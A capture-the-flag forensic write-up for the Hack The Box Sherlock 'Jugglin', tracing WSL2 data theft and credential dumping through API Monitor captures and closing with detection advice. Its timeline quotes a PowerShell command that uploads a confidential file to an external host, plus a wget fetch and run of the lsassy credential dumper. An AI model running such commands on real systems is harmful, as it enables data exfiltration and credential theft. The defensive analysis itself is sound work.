---
sherlock: Jugglin
domain: DFIR
difficulty: Medium
platform: Hack The Box
evidence: Two API Monitor captures (.apmx64) from WSL2 sessions
tools: [API Monitor, CyberChef]
state: Active
tags: [dfir, wsl2, apimonitor, credential-access, exfiltration, t1567]
---

# Jugglin — Hack The Box (Sherlock)

**English** | [🇪🇸 Español](README.md)

> **State:** Active. Investigation notes; no platform answers.

## Scenario

A company suspects its workstations have been used through **WSL2** to move data out and to dump credentials while leaving no trace in Windows command-line logs. Two API call captures are provided: one from an employee and one from an attacker host.

## Evidence

- `Insider.apmx64`: API Monitor session from the employee workstation.
- `Attacker.apmx64`: API Monitor session from the attacker host.

```bash
sha256sum Insider.apmx64 Attacker.apmx64     # record hashes before analysing
```

`.apmx64` files are containers: open them with **API Monitor** (Rohitab), which loads the session and lets you filter by process and API. They are neither memory dumps nor PCAPs.

## Investigation

### 1. Inventory and triage

First identify **which process** makes the calls: if `wsl.exe` or `wslhost.exe` shows up, the work happens inside the Linux distribution and Windows telemetry only sees the bridge.

```text
API Monitor → File → Open → Insider.apmx64
Filter: Process Name = wsl.exe
```

The call tree shows `KERNELBASE.dll` string-conversion functions, not a Linux shell's: guest activity is translated to UTF-8/UTF-16 on the Windows side before leaving.

### 2. Timeline

In the employee capture, `wsl.exe` chains:

```text
WideCharToMultiByte
RtlUnicodeToUTF8N
...
whoami
cat flag.txt
Invoke-WebRequest -Uri http://<EXTERNAL> -Method POST -InFile confidential.txt
```

Order matters: reconnaissance (`whoami`) first, then reading the target, then the upload. The relevant network call is not the guest's `curl` or `wget` but PowerShell inside the session, which is what gets recorded.

The attacker capture shows a credential-dumping tool being pulled down:

```text
wget http://3.6.165.8/lsassy
lsassy -d <DOMAIN> -u <USER>
```

The result is the session user's hash, not a full `lsass.exe` dump: `lsassy` reads process memory and extracts credentials without writing a `.dmp` to disk, which is exactly what avoids file-based detection.

### 3. Key artifact

The artifact that cracks the case is the **`wsl.exe` API trace**, specifically the pair:

- `RtlUnicodeToUTF8N` / `WideCharToMultiByte`: the boundary between guest and Windows.
- `WriteFile`: the call to intercept to see what is written and where in a WSL2 environment.

Without that trace, an EDR auditing only Windows processes sees neither the `cat` nor the upload: the binary running the command is a Linux one and produces no 4688.

## Findings

- The employee used WSL2 to read a marked file and upload it over HTTP: exfiltration with built-in tools.
- The attacker used the same path to run `lsassy` and pull a hash from LSASS memory, leaving no dump on disk.
- The activity is invisible to Windows command-line auditing because the process executing the commands is not a Windows process.

## Lessons

- WSL2 is not "a separate VM" for forensic purposes: it shares kernel and network with the host and its activity can be captured at the bridge (`wsl.exe`).
- `lsassy` and friends avoid the `.dmp` file; detection must watch access to `lsass.exe` (Sysmon 10 / 4656 with `PROCESS_VM_READ`), not just dump creation.
- An `Invoke-WebRequest` to an external IP from an interactive session deserves an alert, whatever shell launched it.
- The organisation lacks WSL2 telemetry: without API/ETW capture at the bridge there is no evidence.

## Mitigations and detection

- Restrict WSL2 by policy (Intune/AppLocker) on workstations that do not need it and audit its use.
- Alert on `wsl.exe` with children making Internet connections and on processes opening `lsass.exe` with `PROCESS_VM_READ`.
- Keep API/ETW captures of the WSL bridge on critical hosts; without them analysis is blind.
- Review `known_hosts`, PowerShell history and proxy configuration for correlation.

MITRE: T1567.002 (exfiltration over web service), T1003.001 (LSASS memory), T1059.004 (Unix shell), T1027 (obfuscated files or information).

## References

- <https://mwalkowski.com/post/sherlock-jugglin/>
- <https://medium.com/@chaoskist/htb-sherlocks-write-up-jugglin-d52d7377f5d2>
- <https://learn.microsoft.com/en-us/windows/wsl/>
- <https://github.com/Hackndo/lsassy>
